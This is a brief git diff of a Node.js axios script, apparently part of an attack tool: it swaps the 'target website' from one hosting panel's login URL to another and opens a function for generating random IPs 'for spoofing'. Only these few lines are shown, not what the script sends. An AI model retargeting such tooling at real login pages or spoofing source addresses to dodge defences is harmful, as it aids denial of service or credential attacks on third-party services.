@@ -1,7 +1,7 @@
 const axios = require("axios");
 
 // Target website
-const TARGET_URL = "https://control.bolthosting.fun/auth/login";
+const TARGET_URL = "https://panel.titannode.fun/auth/login";
 
 // Function to generate a random IP for spoofing
 function getRandomIP() {
